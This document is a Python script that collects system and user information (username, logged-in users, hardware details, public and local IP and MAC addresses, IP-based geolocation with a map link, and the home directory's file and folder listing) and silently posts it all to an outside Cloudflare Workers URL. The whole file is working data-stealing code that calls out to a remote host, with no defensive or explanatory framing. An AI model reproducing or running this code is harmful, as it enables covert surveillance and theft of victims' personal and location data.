import sys
import json
import socket
import psutil
import pathlib
import getpass
import platform
import datetime
import requests
home = pathlib.Path.home()
def run_paths():
	f = []
	d = []
	for p in home.glob("*"):
		if p.is_dir():
			d.append(str(p))
		elif p.is_file():
			f.append(str(p))
	return d, f
def get_ip():
    try:
        ipv4 = []
        ipv6 = []
        mac = []
        for iface, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == socket.AF_INET:
                    ipv4.append(addr.address)
                elif addr.family == socket.AF_INET6:
                    ipv6.append(addr.address)
                elif addr.family in (psutil.AF_LINK, getattr(socket, "AF_PACKET", None)):
                    mac.append(addr.address)
        return ipv4, ipv6, mac
    except Exception as e:
        return str(e)
def public_ip():
	req = requests.get("https://api64.ipify.org/")
	if req.status_code == 200:
		return req.text
	else:
		return req.status_code
def ip_info():
	r = requests.get("http://ip-api.com/json/")
	if r.status_code == 200:
		j = json.loads(r.text)
		return j
	return None
def logged():
	u = []
	for it in psutil.users():
		u.append(it.name)
	return u
user = getpass.getuser()
exe = pathlib.Path(sys.executable).name
pts = run_paths()
time = datetime.datetime.now().strftime("%d/%m/%Y - %H:%M:%S")
i = get_ip()
i_info = ip_info()
lo = str(logged()).replace("[","").replace("]","")
cc = psutil.cpu_count()
cf = psutil.cpu_freq().current
ram = psutil.virtual_memory().total // 1024 // 1024
i4 = str(i[0]).replace("[","").replace("]","")
i6 = str(i[1]).replace("[","").replace("]","")
mc = str(i[2]).replace("[","").replace("]","")
sy = platform.system()
nd = platform.node()
re = platform.release()
d_path = str(pts[0]).replace("[","").replace("]","").replace(",","\r\n")
f_path = str(pts[1]).replace("[","").replace("]","").replace(",","\r\n")
payload = f"""
---------- 𝐔𝐒𝐄𝐑 𝐃𝐀𝐓𝐀 ----------

Execution time: {time}

User: {user}

Logged Users: {lo}

CPU: {cc}

CPU Frequency: {cf}

RAM: {ram}MB

Public IP: {public_ip()}

Country: {i_info['country']}

Region: {i_info['regionName']}

City: {i_info['city']}

ISP: {i_info['isp']}

Organization: {i_info['org']}

Alias: {i_info['as']}

IPv4: {i4}

IPv6: {i6}

MAC: {mc}

System: {sy}

Node: {nd}

Version: {re}

Google Maps Link: https://www.google.com/maps/search/?q={i_info['lat']},{i_info['lon']}

-------- 𝐅𝐢𝐥𝐞𝐬 𝐀𝐧𝐝 𝐃𝐢𝐫𝐞𝐜𝐭𝐨𝐫𝐢𝐞𝐬 ---------

{d_path}

{f_path}

----------------------------------------
"""
content = json.dumps({"msg": payload})
r = requests.post("https://curly-dream-4ac6.encrypteddev111k.workers.dev/", data=content)
if r.status_code == 200:
	print("yes")
	
